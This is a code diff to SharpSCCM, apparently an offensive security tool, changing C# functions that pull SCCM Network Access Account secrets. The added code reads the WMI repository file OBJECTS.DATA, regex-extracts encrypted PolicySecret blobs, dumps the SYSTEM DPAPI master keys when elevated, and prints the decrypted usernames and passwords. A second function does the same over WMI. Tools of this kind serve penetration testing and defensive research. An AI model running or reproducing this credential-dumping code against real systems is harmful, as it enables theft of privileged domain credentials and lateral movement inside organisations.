@@ -2,108 +2,92 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Management;
+using System.Text;
+using System.Text.RegularExpressions;
 
 namespace SharpSCCM
 {
     public class Credentials
     {
-
         public static void LocalNetworkAccessAccountsDisk()
         {
+            // Thanks to @guervild on Github for contributing this code to SharpDPAPI
+
             Console.WriteLine($"[*] Retrieving Network Access Account blobs from CIM repository");
 
+            string fileData = "";
+            MemoryStream ms = new MemoryStream();
+
             // Path of the CIM repository
-            string cimRepoPath = "C:\\Windows\\System32\\Wbem\\Repository\\OBJECTS.DATA";
+            string path = "";
 
-            // We don't have to be elevated to read the blobs...
-            // get size of file
-            FileInfo cimRepo = new FileInfo(cimRepoPath);
-            uint bytesToSearch = (uint) (int) cimRepo.Length;
-
-            if (FileContainsDpapiBlob(cimRepoPath, bytesToSearch))
+            if (!System.Environment.Is64BitProcess)
             {
-                Console.WriteLine($"[*]     Found potential DPAPI blob at {cimRepoPath}\n");
+                path = $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Windows\\Sysnative\\Wbem\\Repository\\OBJECTS.DATA";
             }
             else
             {
-                Console.WriteLine($"[!]     No DPAPI blob found");
+                path = $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Windows\\System32\\Wbem\\Repository\\OBJECTS.DATA";
             }
 
-            // Parse from CIM repo
-            //string protectedUsername = "";
-            //string protectedPassword = "";
-
-            // TODO -- Logic to strip blob
-            // But we do have to be elevated to retrieve the system masterkeys...
-            if (Helpers.IsHighIntegrity())
+            if (File.Exists(path))
             {
-                Dictionary<string, string> mappings = Dpapi.TriageSystemMasterKeys();
-                Console.WriteLine("\r\n[*] SYSTEM master key cache:\r\n");
-                foreach (KeyValuePair<string, string> kvp in mappings)
+                using (FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                using (var sr = new StreamReader(fs, Encoding.Default))
                 {
-                    Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
+                    fileData = sr.ReadToEnd();
                 }
-                Console.WriteLine();
 
-                //try
-                //{
-                //    string username = Dpapi.Execute(protectedUsername, mappings);
-                //    string password = Dpapi.Execute(protectedPassword, mappings);
+                Regex regexData = new Regex(@"CCM_NetworkAccessAccount.*<PolicySecret Version=""1""><!\[CDATA\[(.*?)\]\]><\/PolicySecret>.*<PolicySecret Version=""1""><!\[CDATA\[(.*?)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled);
+                var matchesData = regexData.Matches(fileData);
 
-                //    Console.WriteLine("\r\n[*] Triaging Network Access Account Credentials\r\n");
-                //    Console.WriteLine("     Plaintext NAA Username         : {0}", username);
-                //    Console.WriteLine("     Plaintext NAA Password         : {0}\n", password);
-                //}
-                //catch (Exception e)
-                //{
-                //    Console.WriteLine("[!] Data was not decrypted. An error occurred.");
-                //    Console.WriteLine(e.ToString());
-                //}
+                if (matchesData.Count <= 0)
+                {
+                    Console.WriteLine("\r\n[X] No \"NetworkAccessAccount\" match found.");
+                }
+
+                if (Helpers.IsHighIntegrity())
+                {
+
+                    Dictionary<string, string> masterkeys = Dpapi.TriageSystemMasterKeys();
+
+                    Console.WriteLine("\r\n[*] SYSTEM master key cache:\r\n");
+                    foreach (KeyValuePair<string, string> kvp in masterkeys)
+                    {
+                        Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
+                    }
+
+                    for (int index = 0; index < matchesData.Count; index++)
+                    {
+
+                        for (int idxGroup = 1; idxGroup < matchesData[index].Groups.Count; idxGroup++)
+                        {
+                            try
+                            {
+                                string naaPlaintext = "";
+                                Console.WriteLine(
+                                    "\r\n[*] Triaging SCCM Network Access Account Credentials from CIM Repository\r\n");
+                                naaPlaintext = Dpapi.Execute(matchesData[index].Groups[idxGroup].Value, masterkeys);
+                                Console.WriteLine("     Plaintext NAA   : {0}", naaPlaintext);
+                                Console.WriteLine();
+                            }
+                            catch (Exception e)
+                            {
+                                Console.WriteLine("[!] Data was not decrypted. An error occurred.");
+                                Console.WriteLine(e.ToString());
+                            }
+                        }
+                    }
+                }
+                else
+                {
+                    Console.WriteLine("\r\n[X] You must be elevated to retrieve masterkeys.\r\n");
+                }
             }
-        }
-
-        private static readonly byte[] dpapiBlobHeader =
-{
-            // Version(4 bytes) | DPAPI Proivder Guid(16-bytes - df9d8cd0-1501-11d1-8c7a-00c04fc297eb)
-            0x01, 0x00, 0x00, 0x00, 0xD0, 0x8C, 0x9D, 0xDF, 0x01, 0x15, 0xD1, 0x11, 0x8C, 0x7A, 0x00, 0xC0, 0x4F, 0xC2, 0x97, 0xEB
-        };
-
-        private static readonly byte[][] dpapiBlobSearches =
-        {
-            dpapiBlobHeader,
-
-            // The following are potential base64 representations of the DPAPI provider GUID
-            // Generated by putting dpapiProviderGuid into the script here: https://www.leeholmes.com/blog/2017/09/21/searching-for-content-in-base-64-strings/
-            System.Text.Encoding.ASCII.GetBytes("AAAA0Iyd3wEV0RGMegDAT8KX6"),
-            System.Text.Encoding.ASCII.GetBytes("AQAAANCMnd8BFdERjHoAwE/Cl+"),
-            System.Text.Encoding.ASCII.GetBytes("EAAADQjJ3fARXREYx6AMBPwpfr"),
-
-            // Hex string representation
-            System.Text.Encoding.ASCII.GetBytes("01000000D08C9DDF0115D1118C7A00C04FC297EB")
-        };
-
-        private static bool FileContainsDpapiBlob(string path, uint bytesToSearch)
-        {
-            // Does the file contain a DPAPI blob?
-            var fileContents = new byte[bytesToSearch];
-            using (var file = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+            else
             {
-                file.Read(fileContents, 0, (int)bytesToSearch);
+                Console.WriteLine("\r\n[X] OBJECTS.DATA does not exist or is not readable.\r\n");
             }
-
-            return ContainsDpapiBlob(fileContents);
-        }
-
-        private static bool ContainsDpapiBlob(byte[] bytes)
-        {
-            // return bytes.Contains(dpapiProviderGuid);
-            foreach (var searchBytes in dpapiBlobSearches)
-            {
-                if (bytes.Contains(searchBytes))
-                    return true;
-            }
-
-            return false;
         }
 
         public static void LocalNetworkAccessAccountsWmi()
@@ -111,7 +95,7 @@ namespace SharpSCCM
             if (Helpers.IsHighIntegrity())
             {
                 Console.WriteLine($"[*] Retrieving Network Access Account blobs via WMI\n");
-                ManagementScope wmiConnection = MgmtUtil.NewWmiConnection("localhost","root\\ccm\\policy\\Machine\\ActualConfig");
+                ManagementScope wmiConnection = MgmtUtil.NewWmiConnection("localhost", "root\\ccm\\policy\\Machine\\ActualConfig");
                 //MgmtUtil.GetClassInstances(wmiConnection, "CCM_NetworkAccessAccount");
                 ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery("SELECT * FROM CCM_NetworkAccessAccount"));
                 ManagementObjectCollection accounts = searcher.Get();
@@ -121,15 +105,16 @@ namespace SharpSCCM
                     {
                         string protectedUsername = account["NetworkAccessUsername"].ToString().Split('[')[2].Split(']')[0];
                         string protectedPassword = account["NetworkAccessPassword"].ToString().Split('[')[2].Split(']')[0];
+
                         byte[] protectedUsernameBytes = Helpers.StringToByteArray(protectedUsername);
                         int length = (protectedUsernameBytes.Length + 16 - 1) / 16 * 16;
                         Array.Resize(ref protectedUsernameBytes, length);
 
 
-                        Dictionary<string, string> mappings = Dpapi.TriageSystemMasterKeys();
+                        Dictionary<string, string> masterkeys = Dpapi.TriageSystemMasterKeys();
 
                         Console.WriteLine("\r\n[*] SYSTEM master key cache:\r\n");
-                        foreach (KeyValuePair<string, string> kvp in mappings)
+                        foreach (KeyValuePair<string, string> kvp in masterkeys)
                         {
                             Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
                         }
@@ -137,12 +122,19 @@ namespace SharpSCCM
 
                         try
                         {
-                            string username = Dpapi.Execute(protectedUsername, mappings);
-                            string password = Dpapi.Execute(protectedPassword, mappings);
+                            string username = Dpapi.Execute(protectedUsername, masterkeys);
+                            string password = Dpapi.Execute(protectedPassword, masterkeys);
 
-                            Console.WriteLine("\r\n[*] Triaging Network Access Account Credentials\r\n");
-                            Console.WriteLine("     Plaintext NAA Username         : {0}", username);
-                            Console.WriteLine("     Plaintext NAA Password         : {0}\n", password);
+                            if (username.StartsWith("00 00 0E 0E 0E") || password.StartsWith("00 00 0E 0E 0E"))
+                            {
+                                Console.WriteLine("\r\n[!] SCCM is configured to use the client's machine account instead of NAA\r\n");
+                            }
+                            else
+                            {
+                                Console.WriteLine("\r\n[*] Triaging Network Access Account Credentials\r\n");
+                                Console.WriteLine("     Plaintext NAA Username         : {0}", username);
+                                Console.WriteLine("     Plaintext NAA Password         : {0}\n", password);
+                            }
                         }
                         catch (Exception e)
                         {
